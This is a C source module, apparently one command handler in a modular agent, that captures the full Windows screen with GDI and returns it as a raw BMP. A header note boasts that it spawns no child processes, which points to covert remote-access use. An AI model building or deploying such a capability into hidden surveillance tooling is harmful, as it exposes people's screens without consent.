// chunk: commands/cmd_screenshot
// depends: (none)
// provides: cmd_screenshot
// libs: gdi32
// note: screenshot via GDI — returns raw BMP, zero child processes

#ifndef CHUNK_CMD_SCREENSHOT
#define CHUNK_CMD_SCREENSHOT

static int cmd_screenshot(const char *args, DWORD args_len, char *out, DWORD *out_len) {
    (void)args; (void)args_len;
    DWORD cap = *out_len;

    HDC hScreen = GetDC(NULL);
    if (!hScreen) { *out_len = 0; return 1; }

    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hMem = CreateCompatibleDC(hScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, w, h);
    SelectObject(hMem, hBmp);
    BitBlt(hMem, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);

    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(bi);
    bi.biWidth = w;
    bi.biHeight = -h;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    DWORD row = ((w * 3 + 3) & ~3);
    DWORD img_sz = row * h;

    BITMAPFILEHEADER bf = {0};
    bf.bfType = 0x4D42;
    bf.bfSize = sizeof(bf) + sizeof(bi) + img_sz;
    bf.bfOffBits = sizeof(bf) + sizeof(bi);

    DWORD total = sizeof(bf) + sizeof(bi) + img_sz;
    if (total > cap) {
        DeleteObject(hBmp); DeleteDC(hMem); ReleaseDC(NULL, hScreen);
        *out_len = 0;
        return 1;
    }

    BYTE *pixels = (BYTE *)malloc(img_sz);
    if (!pixels) {
        DeleteObject(hBmp); DeleteDC(hMem); ReleaseDC(NULL, hScreen);
        *out_len = 0;
        return 1;
    }

    GetDIBits(hMem, hBmp, 0, h, pixels, (BITMAPINFO *)&bi, DIB_RGB_COLORS);

    memcpy(out, &bf, sizeof(bf));
    memcpy(out + sizeof(bf), &bi, sizeof(bi));
    memcpy(out + sizeof(bf) + sizeof(bi), pixels, img_sz);
    *out_len = total;

    free(pixels);
    DeleteObject(hBmp);
    DeleteDC(hMem);
    ReleaseDC(NULL, hScreen);
    return 0;
}

#endif
